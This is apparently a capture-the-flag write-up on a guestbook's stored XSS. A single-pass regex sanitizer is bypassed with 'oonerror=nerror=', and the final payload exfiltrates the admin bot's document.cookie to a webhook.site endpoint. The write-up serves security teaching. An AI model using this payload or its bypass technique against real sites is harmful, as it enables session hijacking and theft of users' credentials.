# Guestbook — Stored XSS + Sanitizer Bypass

## Overview

The application is a guestbook where visitors can leave messages. A **"Report to Curator"** feature allows submitting a URL that a bot (with admin cookies) will visit. Entries are rendered via `innerHTML` after passing through a client-side `sanitize()` function.

---

## Vulnerability

The `sanitize()` function applies a series of regex replacements:

```javascript
function sanitize(s) {
  return s
    .replace(/<\s*script[^>]*>/gi, '')
    .replace(/<\s*\/\s*script\s*>/gi, '')
    .replace(/on\w+\s*=/gi, '')      // removes onerror=, onclick=, etc.
    .replace(/javascript:/gi, '');
}
```

The critical flaw is that the regex `/on\w+\s*=/gi` is applied **only once** and is **not recursive**. This means a carefully crafted string can survive the replacement and reconstruct a valid event handler after sanitization.

---

## Bypass

The regex matches and removes `onerror=` from `oonerror=nerror=`, leaving behind `onerror=`:

```
oonerror=nerror=  -->  (removes "onerror=")  -->  onerror=
```

This reconstructs a valid HTML event handler after sanitization.

---

## Exploit

### Payload (inserted in the message field)

```html
<img src=x oonerror=nerror=fetch(`https://webhook.site/<token>/?c=`+document.cookie)>
```

After `sanitize()` runs, the browser receives:

```html
<img src=x onerror=fetch(`https://webhook.site/<token>/?c=`+document.cookie)>
```

The `<img>` tag fails to load `src=x`, triggering `onerror`, which executes the `fetch` and exfiltrates `document.cookie`.
